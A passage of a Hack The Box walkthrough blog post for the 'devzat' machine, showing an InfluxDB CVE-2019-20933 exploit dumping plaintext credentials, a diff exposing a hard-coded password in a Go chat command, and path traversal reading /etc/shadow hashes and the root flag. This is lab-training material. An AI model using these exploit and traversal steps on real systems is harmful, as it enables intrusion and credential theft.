+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/devzat]</span><br><span class="line">└─<span class="comment"># python3 /root/InfluxDB-Exploit-CVE-2019-20933/__main__.py </span></span><br><span class="line">  _____        __ _            _____  ____    ______            _       _ _   </span><br><span class="line"> |_   _|      / _| |          |  __ \|  _ \  |  ____|          | |     (_) |  </span><br><span class="line">   | |  _ __ | |_| |_   ___  __ |  | | |_) | | |__  __  ___ __ | | ___  _| |_ </span><br><span class="line">   | | | <span class="string">&#x27;_ \|  _| | | | \ \/ / |  | |  _ &lt;  |  __| \ \/ / &#x27;</span>_ \| |/ _ \| | __|</span><br><span class="line">  _| |_| | | | | | | |_| |&gt;  &lt;| |__| | |_) | | |____ &gt;  &lt;| |_) | | (_) | | |_ </span><br><span class="line"> |_____|_| |_|_| |_|\__,_/_/\_\_____/|____/  |______/_/\_\ .__/|_|\___/|_|\__|</span><br><span class="line">                                                         | |                  </span><br><span class="line">                                                         |_|                  </span><br><span class="line">CVE-2019-20933</span><br><span class="line"></span><br><span class="line">Insert ip host (default localhost): </span><br><span class="line">Insert port (default 8086): </span><br><span class="line">Insert influxdb user (wordlist path to bruteforce username): /usr/share/seclists/Usernames/Names/names.txt</span><br><span class="line"></span><br><span class="line">Start username bruteforce</span><br><span class="line">[x] aaliyah</span><br><span class="line">[x] aaren</span><br><span class="line">[x] aarika</span><br><span class="line">[x] aaron</span><br><span class="line">[x] aartjan</span><br><span class="line">[x] aarushi</span><br><span class="line">[x] abagael</span><br><span class="line">[x] abagail</span><br><span class="line">[x] abahri</span><br><span class="line">[x] abbas</span><br><span class="line">[x] abbe</span><br><span class="line">[x] abbey</span><br><span class="line">[x] abbi</span><br><span class="line">[x] abbie</span><br><span class="line">[x] abby</span><br><span class="line">[x] abbye</span><br><span class="line">[x] abdalla</span><br><span class="line">[x] abdallah</span><br><span class="line">[x] abdul</span><br><span class="line">[x] abdullah</span><br><span class="line">[x] abe</span><br><span class="line">[x] abel</span><br><span class="line">[x] abi</span><br><span class="line">[x] abia</span><br><span class="line">[x] abigael</span><br><span class="line">[x] abigail</span><br><span class="line">[x] abigale</span><br><span class="line">......</span><br><span class="line">Host vulnerable !!!</span><br><span class="line">Databases list:</span><br><span class="line"></span><br><span class="line">1) devzat</span><br><span class="line">2) _internal</span><br><span class="line"></span><br><span class="line">Insert database name (<span class="built_in">exit</span> to close): devzat</span><br><span class="line">[devzat] Insert query (<span class="built_in">exit</span> to change db): SELECT * FROM <span class="string">&quot;user&quot;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;results&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;series&quot;</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;columns&quot;</span>: [</span><br><span class="line">                        <span class="string">&quot;time&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;enabled&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;password&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;username&quot;</span></span><br><span class="line">                    ],</span><br><span class="line">                    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;values&quot;</span>: [</span><br><span class="line">                        [</span><br><span class="line">                            <span class="string">&quot;2021-06-22T20:04:16.313965493Z&quot;</span>,</span><br><span class="line">                            <span class="literal">false</span>,</span><br><span class="line">                            <span class="string">&quot;WillyWonka2021&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;wilhelm&quot;</span></span><br><span class="line">                        ],</span><br><span class="line">                        [</span><br><span class="line">                            <span class="string">&quot;2021-06-22T20:04:16.320782034Z&quot;</span>,</span><br><span class="line">                            <span class="literal">true</span>,</span><br><span class="line">                            <span class="string">&quot;woBeeYareedahc7Oogeephies7Aiseci&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;catherine&quot;</span></span><br><span class="line">                        ],</span><br><span class="line">                        [</span><br><span class="line">                            <span class="string">&quot;2021-06-22T20:04:16.996682002Z&quot;</span>,</span><br><span class="line">                            <span class="literal">true</span>,</span><br><span class="line">                            <span class="string">&quot;RoyalQueenBee$&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;charles&quot;</span></span><br><span class="line">                        ]</span><br><span class="line">                    ]</span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;statement_id&quot;</span>: 0</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>We got catherine user’s creds. Let’s login, SSH won’t work. So use ‘su’.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">patrick@devzat:/tmp$ su catherine</span><br><span class="line">Password: </span><br><span class="line">catherine@devzat:/tmp$ <span class="built_in">cd</span> ~</span><br><span class="line">catherine@devzat:~$ <span class="built_in">cat</span> user.txt </span><br><span class="line">9919bf525c5b8306176eaa39e17110d5</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2090.jpg"></li>
+</ul>
+<h1 id="get-root"><a href="#get-root" class="headerlink" title="get root"></a>get root</h1><p>We got the user flag, let’s run the linpeas one more time.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#)You_can_write_even_more_files_inside_last_directory</span></span><br><span class="line">/var/backups/devzat-dev.zip</span><br><span class="line">/var/backups/devzat-main.zip</span><br><span class="line">/var/crash</span><br><span class="line">/var/tmp</span><br></pre></td></tr></table></figure>
+
+<p>Under backups there are two zip files, lets copy them to &#x2F;tmp location and extract both.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">catherine@devzat:/tmp$ unzip devzat-dev.zip</span><br><span class="line">Archive:  devzat-dev.zip</span><br><span class="line">   creating: dev/</span><br><span class="line">  inflating: dev/go.mod              </span><br><span class="line"> extracting: dev/.gitignore          </span><br><span class="line">  inflating: dev/util.go             </span><br><span class="line">  inflating: dev/testfile.txt        </span><br><span class="line">  inflating: dev/eastereggs.go       </span><br><span class="line">  inflating: dev/README.md           </span><br><span class="line">  inflating: dev/games.go            </span><br><span class="line">  inflating: dev/colors.go           </span><br><span class="line"> extracting: dev/log.txt             </span><br><span class="line">  inflating: dev/commands.go         </span><br><span class="line">  inflating: dev/start.sh            </span><br><span class="line">  inflating: dev/devchat.go          </span><br><span class="line">  inflating: dev/LICENSE             </span><br><span class="line">  inflating: dev/commandhandler.go   </span><br><span class="line">  inflating: dev/art.txt             </span><br><span class="line">  inflating: dev/go.sum              </span><br><span class="line"> extracting: dev/allusers.json       </span><br><span class="line">catherine@devzat:/tmp$ unzip devzat-main.zip</span><br><span class="line">Archive:  devzat-main.zip</span><br><span class="line">   creating: main/</span><br><span class="line">  inflating: main/go.mod             </span><br><span class="line"> extracting: main/.gitignore         </span><br><span class="line">  inflating: main/util.go            </span><br><span class="line">  inflating: main/eastereggs.go      </span><br><span class="line">  inflating: main/README.md          </span><br><span class="line">  inflating: main/games.go           </span><br><span class="line">  inflating: main/colors.go          </span><br><span class="line"> extracting: main/log.txt            </span><br><span class="line">  inflating: main/commands.go        </span><br><span class="line">  inflating: main/start.sh           </span><br><span class="line">  inflating: main/devchat.go         </span><br><span class="line">  inflating: main/LICENSE            </span><br><span class="line">  inflating: main/commandhandler.go  </span><br><span class="line">  inflating: main/art.txt            </span><br><span class="line">  inflating: main/go.sum             </span><br><span class="line">  inflating: main/allusers.json</span><br></pre></td></tr></table></figure>
+
+<p>After extraction, you will find almost identical files and it’s content. However, if you look at the difference between commands.go file, we will find something interesting.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">catherine@devzat:/tmp$ diff main/commands.go dev/commands.go</span><br><span class="line">3a4</span><br><span class="line">&gt;       <span class="string">&quot;bufio&quot;</span></span><br><span class="line">4a6,7</span><br><span class="line">&gt;       <span class="string">&quot;os&quot;</span></span><br><span class="line">&gt;       <span class="string">&quot;path/filepath&quot;</span></span><br><span class="line">36a40</span><br><span class="line">&gt;               file        = commandInfo&#123;<span class="string">&quot;file&quot;</span>, <span class="string">&quot;Paste a files content directly to chat [alpha]&quot;</span>, fileCommand, 1, <span class="literal">false</span>, nil&#125;</span><br><span class="line">38c42,101</span><br><span class="line">&lt;       commands = []commandInfo&#123;clear, message, <span class="built_in">users</span>, all, <span class="built_in">exit</span>, bell, room, kick, <span class="built_in">id</span>, _commands, nick, color, timezone, emojis, <span class="built_in">help</span>, tictactoe, hangman, shrug, asciiArt, exampleCode&#125;</span><br><span class="line">---</span><br><span class="line">&gt;       commands = []commandInfo&#123;clear, message, <span class="built_in">users</span>, all, <span class="built_in">exit</span>, bell, room, kick, <span class="built_in">id</span>, _commands, nick, color, timezone, emojis, <span class="built_in">help</span>, tictactoe, hangman, shrug, asciiArt, exampleCode, file&#125;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; </span><br><span class="line">&gt; func fileCommand(u *user, args []string) &#123;</span><br><span class="line">&gt;       <span class="keyword">if</span> len(args) &lt; 1 &#123;</span><br><span class="line">&gt;               u.system(<span class="string">&quot;Please provide file to print and the password&quot;</span>)</span><br><span class="line">&gt;               <span class="built_in">return</span></span><br><span class="line">&gt;       &#125;</span><br><span class="line">&gt; </span><br><span class="line">&gt;       <span class="keyword">if</span> len(args) &lt; 2 &#123;</span><br><span class="line">&gt;               u.system(<span class="string">&quot;You need to provide the correct password to use this function&quot;</span>)</span><br><span class="line">&gt;               <span class="built_in">return</span></span><br><span class="line">&gt;       &#125;</span><br><span class="line">&gt; </span><br><span class="line">&gt;       path := args[0]</span><br><span class="line">&gt;       pass := args[1]</span><br><span class="line">&gt; </span><br><span class="line">&gt;       // Check my secure password</span><br><span class="line">&gt;       <span class="keyword">if</span> pass != <span class="string">&quot;CeilingCatStillAThingIn2021?&quot;</span> &#123;</span><br><span class="line">&gt;               u.system(<span class="string">&quot;You did provide the wrong password&quot;</span>)</span><br><span class="line">&gt;               <span class="built_in">return</span></span><br><span class="line">&gt;       &#125;</span><br><span class="line">&gt; </span><br><span class="line">&gt;       // Get CWD</span><br><span class="line">&gt;       cwd, err := os.Getwd()</span><br><span class="line">&gt;       <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">&gt;               u.system(err.Error())</span><br><span class="line">&gt;       &#125;</span><br><span class="line">&gt; </span><br><span class="line">&gt;       // Construct path to <span class="built_in">print</span></span><br><span class="line">&gt;       printPath := filepath.Join(cwd, path)</span><br><span class="line">&gt; </span><br><span class="line">&gt;       // Check <span class="keyword">if</span> file exists</span><br><span class="line">&gt;       <span class="keyword">if</span> _, err := os.Stat(printPath); err == nil &#123;</span><br><span class="line">&gt;               // exists, <span class="built_in">print</span></span><br><span class="line">&gt;               file, err := os.Open(printPath)</span><br><span class="line">&gt;               <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">&gt;                       u.system(fmt.Sprintf(<span class="string">&quot;Something went wrong opening the file: %+v&quot;</span>, err.Error()))</span><br><span class="line">&gt;                       <span class="built_in">return</span></span><br><span class="line">&gt;               &#125;</span><br><span class="line">&gt;               defer file.Close()</span><br><span class="line">&gt; </span><br><span class="line">&gt;               scanner := bufio.NewScanner(file)</span><br><span class="line">&gt;               <span class="keyword">for</span> scanner.<span class="function"><span class="title">Scan</span></span>() &#123;</span><br><span class="line">&gt;                       u.system(scanner.Text())</span><br><span class="line">&gt;               &#125;</span><br><span class="line">&gt; </span><br><span class="line">&gt;               <span class="keyword">if</span> err := scanner.Err(); err != nil &#123;</span><br><span class="line">&gt;                       u.system(fmt.Sprintf(<span class="string">&quot;Something went wrong printing the file: %+v&quot;</span>, err.Error()))</span><br><span class="line">&gt;               &#125;</span><br><span class="line">&gt; </span><br><span class="line">&gt;               <span class="built_in">return</span></span><br><span class="line">&gt; </span><br><span class="line">&gt;       &#125; <span class="keyword">else</span> <span class="keyword">if</span> os.IsNotExist(err) &#123;</span><br><span class="line">&gt;               // does not exist, <span class="built_in">print</span> error</span><br><span class="line">&gt;               u.system(fmt.Sprintf(<span class="string">&quot;The requested file @ %+v does not exist!&quot;</span>, printPath))</span><br><span class="line">&gt;               <span class="built_in">return</span></span><br><span class="line">&gt;       &#125;</span><br><span class="line">&gt;       // bokred?</span><br><span class="line">&gt;       u.system(<span class="string">&quot;Something went badly wrong.&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>A new function is available in dev, that is file reading capabilities. But, it asks for the password and password if defined in the code. This new function is not available on the application which is running on port 8000, it is on 8443. So, access this port and read the root flag.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">catherine@devzat:/tmp$ ssh -l <span class="built_in">test</span> localhost -p 8443</span><br><span class="line">                                                      2 hours 10 minutes earlier</span><br><span class="line">catharine: file</span><br><span class="line">devbot: catharine has left the chat</span><br><span class="line">devbot: catharine stayed on <span class="keyword">for</span> 2 minutes</span><br><span class="line">                                                       2 hours 6 minutes earlier</span><br><span class="line">devbot: admin has joined the chat</span><br><span class="line">admin: file</span><br><span class="line">devbot: admin has left the chat</span><br><span class="line">                                                       1 hour 54 minutes earlier</span><br><span class="line">devbot: patrick has joined the chat</span><br><span class="line">devbot: patrick has left the chat</span><br><span class="line">devbot: patrick stayed on <span class="keyword">for</span> 1 minute</span><br><span class="line">                                                       1 hour 48 minutes earlier</span><br><span class="line">devbot: catherine has joined the chat</span><br><span class="line">catherine: file /etc/passwd woBeeYareedahc7Oogeephies7Aiseci</span><br><span class="line">                                                       1 hour 44 minutes earlier</span><br><span class="line">devbot: catherine has left the chat</span><br><span class="line">devbot: catherine stayed on <span class="keyword">for</span> 4 minutes</span><br><span class="line">                                                       1 hour 39 minutes earlier</span><br><span class="line">devbot: catherine has joined the chat</span><br><span class="line">                                                       1 hour 23 minutes earlier</span><br><span class="line">devbot: catherine has left the chat</span><br><span class="line">devbot: catherine stayed on <span class="keyword">for</span> 16 minutes</span><br><span class="line">Welcome to the chat. There are no more <span class="built_in">users</span></span><br><span class="line">devbot: <span class="built_in">test</span> has joined the chat</span><br><span class="line">                                                                     1 minute <span class="keyword">in</span></span><br><span class="line"><span class="built_in">test</span>: /file ../root.txt CeilingCatStillAThingIn2021?</span><br><span class="line">[SYSTEM] 67f13f5a6aa22e9cf52f57f19c76f86d</span><br><span class="line"><span class="built_in">test</span>: /file ../etc/shadow CeilingCatStillAThingIn2021?</span><br><span class="line">[SYSTEM] The requested file @ /root/etc/shadow does not exist!</span><br><span class="line"><span class="built_in">test</span>: /file /etc/shadow CeilingCatStillAThingIn2021?</span><br><span class="line">[SYSTEM] The requested file @ /root/devzat/etc/shadow does not exist!</span><br><span class="line">                                                                    3 minutes <span class="keyword">in</span></span><br><span class="line"><span class="built_in">test</span>: /file ../../etc/shadow CeilingCatStillAThingIn2021?</span><br><span class="line">[SYSTEM] root:$6$DKdyL4hqyhhxcRyc<span class="variable">$8N</span>.1K/dHPqLb7VSB0IvfB.uhIKsH7IeGP/iyTRSYImFiAa</span><br><span class="line">         wsaUOKs/TWe0DCp5wSscYvi.XjX8JPe6lZNnEmH/:18891:0:99999:7:::</span><br><span class="line">[SYSTEM] daemon:*:18659:0:99999:7:::</span><br><span class="line">[SYSTEM] bin:*:18659:0:99999:7:::</span><br><span class="line">[SYSTEM] sys:*:18659:0:99999:7:::</span><br><span class="line">[SYSTEM] <span class="built_in">sync</span>:*:18659:0:99999:7:::</span><br><span class="line">[SYSTEM] games:*:18659:0:99999:7:::</span><br><span class="line">[SYSTEM] man:*:18659:0:99999:7:::</span><br><span class="line">[SYSTEM] lp:*:18659:0:99999:7:::</span><br><span class="line">[SYSTEM] mail:*:18659:0:99999:7:::</span><br><span class="line">[SYSTEM] news:*:18659:0:99999:7:::</span><br><span class="line">[SYSTEM] uucp:*:18659:0:99999:7:::</span><br><span class="line">[SYSTEM] proxy:*:18659:0:99999:7:::</span><br><span class="line">[SYSTEM] www-data:*:18659:0:99999:7:::</span><br><span class="line">[SYSTEM] backup:*:18659:0:99999:7:::</span><br><span class="line">[SYSTEM] list:*:18659:0:99999:7:::</span><br><span class="line">[SYSTEM] irc:*:18659:0:99999:7:::</span><br><span class="line">[SYSTEM] gnats:*:18659:0:99999:7:::</span><br><span class="line">[SYSTEM] nobody:*:18659:0:99999:7:::</span><br><span class="line">[SYSTEM] systemd-network:*:18659:0:99999:7:::</span><br><span class="line">[SYSTEM] systemd-resolve:*:18659:0:99999:7:::</span><br><span class="line">[SYSTEM] systemd-timesync:*:18659:0:99999:7:::</span><br><span class="line">[SYSTEM] messagebus:*:18659:0:99999:7:::</span><br><span class="line">[SYSTEM] syslog:*:18659:0:99999:7:::</span><br><span class="line">[SYSTEM] _apt:*:18659:0:99999:7:::</span><br><span class="line">[SYSTEM] tss:*:18659:0:99999:7:::</span><br><span class="line">[SYSTEM] uuidd:*:18659:0:99999:7:::</span><br><span class="line">[SYSTEM] tcpdump:*:18659:0:99999:7:::</span><br><span class="line">[SYSTEM] landscape:*:18659:0:99999:7:::</span><br><span class="line">[SYSTEM] pollinate:*:18659:0:99999:7:::</span><br><span class="line">[SYSTEM] sshd:*:18800:0:99999:7:::</span><br><span class="line">[SYSTEM] systemd-coredump:!!:18800::::::</span><br><span class="line">[SYSTEM] patrick:$6$7ni9PM4l99B7EKPi$/uLBm1IhrKmkS9xPaIgRRZj8aVfASc4eIZt.FvNDEz2</span><br><span class="line">         r06MIsQMEf3bNegOIxGI./UsabjqsRSV6hWxrJrqbj0:18800:0:99999:7:::</span><br><span class="line">[SYSTEM] catherine:$6$.T9ZmexDFzOpXCH/<span class="variable">$u9TICZ3NN5HOC1lWNHGuXP0Hyn</span>/R8HMPS12kUgFdP</span><br><span class="line">         AwUNl8F3qd5yuL6ptmW40IrBLxBMOTjskHfu1CwK72bw0:18800:0:99999:7:::</span><br><span class="line">[SYSTEM] usbmux:*:18800:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2091.jpg"></li>
+</ul>
+<h1 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h1><ul>
+<li>vhost fuzzing</li>
+<li>dir fuzzing</li>
+<li>dump and extract .git dir</li>
+<li>golang source code command injection</li>
+<li>chisel port forwarding</li>
+<li>InfluxDB Exploit CVE-2019-20933 exploit</li>
+<li>golang source code file reading capabilities</li>
+</ul>
+<h1 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h1><ul>
+<li>QQ: 1185151867</li>
+<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
+<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2021/10/19/devzat/" title="Hack-The-Box-walkthrough[devzat]">https://fdlucifer.github.io/2021/10/19/devzat/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/10/03/driver/" rel="prev" title="Hack-The-Box-walkthrough[Driver]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[Driver]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/11/01/secret/" rel="next" title="Hack-The-Box-walkthrough[Secret]">
+                  Hack-The-Box-walkthrough[Secret] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
